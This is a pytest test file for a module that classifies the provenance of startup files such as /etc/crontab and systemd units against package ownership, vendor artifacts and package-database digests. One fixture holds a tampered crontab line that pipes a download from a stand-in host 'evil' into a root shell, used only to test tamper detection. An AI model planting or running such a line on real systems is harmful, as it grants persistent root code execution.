import hashlib

import pytest

from app import startup_provenance as sp


def h(text):
    return hashlib.sha256(text.encode()).hexdigest()


def md5(text):
    return hashlib.md5(text.encode()).hexdigest()


OWNER = {'package': 'cron', 'version': '3.0pl1-184'}
DEFAULT = '0 * * * * root run-parts /etc/cron.hourly\n'


def evidence(**changes):
    base = {'path': '/etc/crontab', 'observed_sha256': h(DEFAULT),
            'ownership': {'complete': True, 'owners': [OWNER], 'diverted': False}}
    base.update(changes)
    return base


def artifact(text=DEFAULT, **changes):
    return {**OWNER, 'sha256': h(text), **changes}


def test_authenticated_exact_version_match_is_verified_default():
    result = sp.classify(evidence(authenticated_artifact=artifact()))
    assert result['provenance'] == 'verified_default' and result['verification'] == 'authenticated'
    assert result['owner'] == OWNER and result['safety'] == 'not_assessed' and not result['gaps']


def test_ownership_alone_and_package_db_match_are_not_verified():
    owned = sp.classify(evidence())
    assert owned['provenance'] == 'unverifiable' and owned['basis'] == 'package_owned'
    assert owned['gaps'][0]['code'] == 'no_authenticated_comparison'
    db = sp.classify(evidence(observed_md5=md5(DEFAULT),
                              package_db_digest={**OWNER, 'algorithm': 'md5', 'value': md5(DEFAULT)}))
    assert db['provenance'] == 'unverifiable' and db['verification'] == 'unauthenticated'
    assert db['basis'] == 'package_db_digest_match' and db['gaps'][0]['code'] == 'unauthenticated_match'


def test_package_db_md5_without_observed_md5_is_not_compared():
    result = sp.classify(evidence(package_db_digest={**OWNER, 'algorithm': 'md5', 'value': md5(DEFAULT)}))
    assert result['provenance'] == 'unverifiable' and result['basis'] == 'package_owned'
    assert [g['code'] for g in result['gaps']] == ['package_db_not_compared', 'no_authenticated_comparison']


def test_modified_from_authenticated_artifact_or_package_db():
    changed = DEFAULT + '* * * * * root /tmp/x\n'
    auth = sp.classify(evidence(observed_sha256=h(changed), authenticated_artifact=artifact()))
    assert auth['provenance'] == 'modified' and auth['verification'] == 'authenticated'
    db = sp.classify(evidence(observed_sha256=h(changed),
                              package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h(DEFAULT)}))
    assert db['provenance'] == 'modified' and db['verification'] == 'unauthenticated'


def test_artifact_for_another_version_or_package_is_not_used():
    for other in ({'version': '3.0pl1-183'}, {'package': 'cronie'}):
        result = sp.classify(evidence(authenticated_artifact=artifact(**other)))
        assert result['provenance'] == 'unverifiable'
        assert [g['code'] for g in result['gaps']] == ['artifact_mismatch', 'no_authenticated_comparison']
    db = sp.classify(evidence(package_db_digest={**OWNER, 'version': '1', 'algorithm': 'sha256', 'value': h('x')}))
    assert db['provenance'] == 'unverifiable' and db['gaps'][0]['code'] == 'package_db_mismatch'


def test_custom_needs_a_complete_ownership_query():
    custom = sp.classify(evidence(ownership={'complete': True, 'owners': [], 'diverted': False}))
    assert custom['provenance'] == 'custom' and custom['owner'] is None and custom['safety'] == 'not_assessed'
    for ownership, code in (({'complete': False, 'owners': []}, 'ownership_incomplete'),
                            (None, 'ownership_not_collected'),
                            ({'complete': True, 'owners': [OWNER], 'diverted': True}, 'diverted'),
                            ({'complete': True, 'owners': [OWNER], 'diverted': 'unknown'}, 'diverted'),
                            ({'complete': True, 'owners': [OWNER, {'package': 'b', 'version': '1'}]},
                             'multiple_owners')):
        result = sp.classify(evidence(ownership=ownership))
        assert result['provenance'] == 'unknown' and result['gaps'][0]['code'] == code


def test_transient_and_generator_sources():
    transient = sp.classify(evidence(path='/run/systemd/transient/run-1.service', source='transient'))
    assert transient['provenance'] == 'unknown' and transient['gaps'][0]['code'] == 'transient_unit'
    generated = sp.classify(evidence(path='/run/systemd/generator/x.mount', source='generator',
                                     authenticated_artifact=artifact()))
    assert generated['provenance'] == 'unverifiable' and generated['basis'] == 'generator_output'


def test_conflict_never_raises_trust():
    # Vendor bytes match, but the target's database says the file changed.
    result = sp.classify(evidence(authenticated_artifact=artifact(),
                                  package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h('other')}))
    assert result['provenance'] == 'unknown' and result['gaps'][0]['code'] == 'conflicting_evidence'


def test_rewritten_file_and_package_db_is_still_modified():
    # A target that rewrote both the file and its package database must not
    # hide the authenticated difference behind a database match.
    tampered = DEFAULT + '* * * * * root curl evil | sh\n'
    result = sp.classify(evidence(observed_sha256=h(tampered), authenticated_artifact=artifact(),
                                  package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h(tampered)}))
    assert result['provenance'] == 'modified' and result['verification'] == 'authenticated'
    assert result['basis'] == 'authenticated_artifact_differs'
    assert result['gaps'][0]['code'] == 'package_db_disagrees'


def test_entries_in_modified_file_are_classified_individually():
    defaults = [h('job-a'), h('job-b')]
    observed = [h('job-a'), h('job-added'), h('job-a')]
    result = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed,
                                  authenticated_artifact=artifact(entry_sha256=defaults)))
    assert result['provenance'] == 'modified'
    assert [e['provenance'] for e in result['entries']] == ['verified_default', 'custom', 'custom']
    assert result['gaps'][0]['code'] == 'default_entries_absent'
    inherited = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed,
                                     authenticated_artifact=artifact()))
    assert {e['provenance'] for e in inherited['entries']} == {'modified'}
    unauth = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed,
                                  package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h(DEFAULT)}))
    assert {e['provenance'] for e in unauth['entries']} == {'modified'}


def test_entries_in_custom_and_unverifiable_files_inherit():
    entries = [h('job')]
    custom = sp.classify(evidence(ownership={'complete': True, 'owners': []}, entry_sha256=entries))
    assert [e['provenance'] for e in custom['entries']] == ['custom']
    owned = sp.classify(evidence(entry_sha256=entries))
    assert [e['provenance'] for e in owned['entries']] == ['unverifiable']


def test_drop_in_is_classified_separately_from_vendor_unit():
    unit = {**OWNER, 'package': 'openssh-server', 'version': '1:9.6p1-3'}
    records = sp.classify_many([
        {'path': '/usr/lib/systemd/system/ssh.service', 'observed_sha256': h('unit'),
         'ownership': {'complete': True, 'owners': [unit]},
         'authenticated_artifact': {**unit, 'sha256': h('unit')}},
        {'path': '/etc/systemd/system/ssh.service.d/override.conf', 'role': 'override', 'modifies': 'ssh.service',
         'observed_sha256': h('[Service]\nExecStart=\n'), 'ownership': {'complete': True, 'owners': []}},
    ])['records']
    assert records[0]['provenance'] == 'verified_default' and records[0]['role'] == 'file'
    assert records[1]['provenance'] == 'custom' and records[1]['modifies'] == 'ssh.service'
    missing = sp.classify(evidence(role='drop_in'))
    assert missing['provenance'] == 'unknown' and missing['gaps'][0]['code'] == 'malformed_evidence'


def test_baseline_acceptance_never_changes_class():
    accepted = {'accepted': True, 'by': 'admin', 'at': 1.0}
    custom = sp.classify(evidence(ownership={'complete': True, 'owners': []}, baseline=accepted))
    assert custom['provenance'] == 'custom'
    assert custom['baseline'] == {'accepted': True, 'affects_provenance': False, 'by': 'admin', 'at': 1.0}
    bogus = sp.classify(evidence(baseline={'accepted': 'yes'}))
    assert bogus['baseline']['accepted'] is False and bogus['gaps'][0]['code'] == 'malformed_baseline'


@pytest.mark.parametrize('changes', [
    {'path': 'relative'}, {'path': '/x\x00y'}, {'path': '/' + 'a' * 5000}, {'path': '/\ud800'},
    {'path': None}, {'observed_sha256': 'zz'}, {'observed_sha256': None},
    {'role': 'script'}, {'role': ['file']}, {'source': 'boot'}, {'source': {}},
    {'entry_sha256': ['bad']}, {'entry_sha256': [h('x')] * (sp.MAX_ENTRIES + 1)},
    {'ownership': {'complete': True, 'owners': [{'package': 'a b', 'version': '1'}]}},
    {'ownership': {'complete': True, 'owners': [OWNER] * (sp.MAX_OWNERS + 1)}},
    {'ownership': {'complete': True, 'owners': 'cron'}},
    {'authenticated_artifact': {'package': 'cron'}},
    {'authenticated_artifact': 'cron'},
    {'authenticated_artifact': artifact(entry_sha256='nope')},
    {'package_db_digest': {**OWNER, 'algorithm': 'sha1', 'value': 'a' * 40}},
    {'package_db_digest': {**OWNER, 'algorithm': ['sha256'], 'value': 'a' * 64}},
    {'package_db_digest': {**OWNER, 'algorithm': 'sha256', 'value': 'z' * 64}},
    {'package_db_digest': 'cron'},
])
def test_malformed_or_oversized_evidence_fails_closed(changes):
    result = sp.classify(evidence(**changes))
    assert result['provenance'] == 'unknown' and result['gaps'] and result['safety'] == 'not_assessed'


def test_gaps_are_bounded():
    gaps = []
    for _ in range(sp.MAX_GAPS + 5):
        sp._gap(gaps, 'x', 'y')
    assert len(gaps) == sp.MAX_GAPS + 1 and gaps[-1]['code'] == 'gaps_truncated'


def test_non_object_and_over_cap_inputs():
    assert sp.classify('x')['provenance'] == 'unknown'
    assert sp.classify_many('x')['records'] == []
    over = sp.classify_many([evidence()] * (sp.MAX_RECORDS + 1))
    assert over['records'] == [] and over['gaps'][0]['code'] == 'over_limit'


def test_every_class_is_reachable():
    seen = {sp.classify(evidence(authenticated_artifact=artifact()))['provenance'],
            sp.classify(evidence(observed_sha256=h('x'), authenticated_artifact=artifact()))['provenance'],
            sp.classify(evidence())['provenance'],
            sp.classify(evidence(ownership={'complete': True, 'owners': []}))['provenance'],
            sp.classify(evidence(ownership=None))['provenance']}
    assert seen == set(sp.CLASSES)
